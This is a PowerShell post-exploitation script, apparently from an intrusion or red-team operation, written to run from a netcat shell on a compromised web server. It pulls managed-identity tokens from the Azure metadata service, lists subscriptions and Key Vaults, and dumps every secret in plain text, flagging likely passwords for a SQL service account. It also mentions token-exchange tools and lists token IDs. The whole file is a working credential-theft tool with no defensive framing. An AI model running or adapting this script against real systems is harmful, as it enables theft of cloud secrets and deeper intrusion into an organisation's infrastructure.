# =============================================================================
# KEYVAULT SECRET EXTRACTION
# Extract svc.mssql password from Azure KeyVault
# Run from nc shell on httpserver OR via RunCommand
# =============================================================================

param(
    [string]$SubscriptionId,
    [string]$ArmToken,
    [string]$VaultToken
)

# ─── Option 1: Managed Identity (if VM has MI) ───────────────────────────────
Write-Output "=== Trying Managed Identity ==="
try {
    $armToken = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" -Headers @{Metadata='true'} -TimeoutSec 5).access_token
    Write-Output "ARM token acquired via MI"
} catch { Write-Output "MI ARM token failed: $($_.Exception.Message)" }

try {
    $kvToken = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -Headers @{Metadata='true'} -TimeoutSec 5).access_token
    Write-Output "Vault token acquired via MI"
} catch { Write-Output "MI Vault token failed: $($_.Exception.Message)" }

# ─── Option 2: Use provided tokens ───────────────────────────────────────────
if ($ArmToken) { $armToken = $ArmToken }
if ($VaultToken) { $kvToken = $VaultToken }

if (-not $armToken) {
    Write-Output "No ARM token available. Provide via -ArmToken or ensure MI is configured."
    return
}

# ─── Discover subscriptions ──────────────────────────────────────────────────
if (-not $SubscriptionId) {
    Write-Output "`n=== Discovering subscriptions ==="
    $subs = (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2022-12-01" -Headers @{Authorization="Bearer $armToken"}).value
    $subs | ForEach-Object { Write-Output "  $($_.subscriptionId) | $($_.displayName)" }
    $SubscriptionId = $subs[0].subscriptionId
    Write-Output "Using: $SubscriptionId"
}

# ─── Discover Key Vaults ─────────────────────────────────────────────────────
Write-Output "`n=== Key Vaults ==="
$vaults = (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" -Headers @{Authorization="Bearer $armToken"}).value
if (-not $vaults) {
    Write-Output "No vaults found"
    return
}
$vaults | ForEach-Object { Write-Output "  $($_.name) | $($_.properties.vaultUri)" }

# ─── Extract secrets from each vault ─────────────────────────────────────────
if (-not $kvToken) {
    Write-Output "`nNo vault.azure.net token. Try FOCI exchange or use Meatball."
    Write-Output "Meatball SiteA vault tokens: 1073, 1065, 1053, 1052, 1051"
    return
}

foreach ($vault in $vaults) {
    $vaultUri = $vault.properties.vaultUri
    $vaultName = $vault.name
    Write-Output "`n=== Vault: $vaultName ==="

    try {
        $secrets = (Invoke-RestMethod -Uri "${vaultUri}secrets?api-version=7.4" -Headers @{Authorization="Bearer $kvToken"}).value
        foreach ($secret in $secrets) {
            $secretName = $secret.id.Split('/')[-1]
            Write-Output "  Secret: $secretName"
            try {
                $value = (Invoke-RestMethod -Uri "$($secret.id)?api-version=7.4" -Headers @{Authorization="Bearer $kvToken"}).value
                # Check if it looks like a password for svc.mssql
                if ($secretName -match 'mssql|sql|svc|password|cred') {
                    Write-Output "    *** POTENTIAL svc.mssql PASSWORD: $value ***"
                } else {
                    Write-Output "    Value: $($value.Substring(0, [Math]::Min(50, $value.Length)))..."
                }
            } catch { Write-Output "    Failed to read value: $($_.Exception.Message)" }
        }
    } catch { Write-Output "  Failed to list secrets: $($_.Exception.Message)" }
}
